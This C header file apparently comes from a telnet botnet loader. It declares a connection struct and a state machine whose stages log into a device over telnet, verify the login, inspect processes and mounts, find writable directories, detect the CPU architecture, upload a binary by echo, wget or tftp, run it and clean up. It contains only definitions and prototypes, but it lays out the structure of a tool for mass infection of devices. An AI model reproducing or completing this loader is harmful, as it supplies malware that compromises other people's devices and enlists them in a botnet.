#pragma once

#include "includes.h"
#include "telnet_info.h"

#define TELNET_CONNECTING 0
#define TELNET_READ_IACS 1
#define TELNET_USER_PROMPT 2
#define TELNET_PASS_PROMPT 3
#define TELNET_WAITPASS_PROMPT 4
#define TELNET_CHECK_LOGIN 5
#define TELNET_VERIFY_LOGIN 6
#define TELNET_PARSE_PS 7
#define TELNET_PARSE_MOUNTS 8
#define TELNET_READ_WRITEABLE 9
#define TELNET_COPY_ECHO 10
#define TELNET_DETECT_ARCH 11
#define TELNET_ARM_SUBTYPE 12
#define TELNET_UPLOAD_METHODS 13
#define TELNET_UPLOAD_ECHO 14
#define TELNET_UPLOAD_WGET 15
#define TELNET_UPLOAD_TFTP 16
#define TELNET_RUN_BINARY 17
#define TELNET_CLEANUP 18
#define TELNET_CLOSED 99

#define UPLOAD_ECHO 0
#define UPLOAD_WGET 1
#define UPLOAD_TFTP 2

struct output_buffer {
    char data[128];
    time_t deadline;
};

struct connection {
    int fd;
    struct server *srv;
    struct telnet_info info;
    int state_telnet;
    int timeout;
    time_t last_recv;
    BOOL open;
    BOOL success;
    BOOL retry_bin;
    BOOL ctrlc_retry;
    struct binary *bin;
    char rdbuf[8192];
    int rdbuf_pos;
    int echo_load_pos;
    struct output_buffer output_buffer;
    pthread_mutex_t lock;
};

void connection_open(struct connection *);
void connection_close(struct connection *);
int connection_consume_iacs(struct connection *);
int connection_consume_login_prompt(struct connection *);
int connection_consume_password_prompt(struct connection *);
int connection_consume_prompt(struct connection *);
int connection_consume_verify_login(struct connection *);
int connection_consume_psoutput(struct connection *);
int connection_consume_mounts(struct connection *);
int connection_consume_written_dirs(struct connection *);
int connection_consume_copy_op(struct connection *);
int connection_consume_arch(struct connection *);
int connection_consume_arm_subtype(struct connection *);
int connection_consume_upload_methods(struct connection *);
int connection_upload_echo(struct connection *);
int connection_upload_wget(struct connection *);
int connection_upload_tftp(struct connection *);
int connection_verify_payload(struct connection *);
int connection_consume_cleanup(struct connection *);
static BOOL can_consume(struct connection *, uint8_t *, int);